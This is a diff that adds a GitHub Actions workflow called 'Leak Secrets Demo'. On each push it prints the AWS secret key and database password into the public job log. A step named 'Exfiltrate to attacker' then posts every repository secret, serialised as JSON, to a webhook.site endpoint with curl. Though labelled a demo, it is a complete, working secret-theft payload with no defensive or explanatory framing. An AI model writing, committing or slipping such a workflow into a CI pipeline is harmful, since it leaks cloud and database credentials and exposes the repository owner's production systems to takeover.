@@ -1,0 +1,13 @@
+name: Leak Secrets Demo
+on: [push]
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak all secrets to public log
+        run: |
+          echo "AWS_SECRET=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
+          echo "PROD_DB_PASS=${{ secrets.DATABASE_PASSWORD }}"
+      - name: Exfiltrate to attacker
+        run: |
+          curl -X POST https://webhook.site/your-unique-id --data "${{ toJSON(secrets) }}"
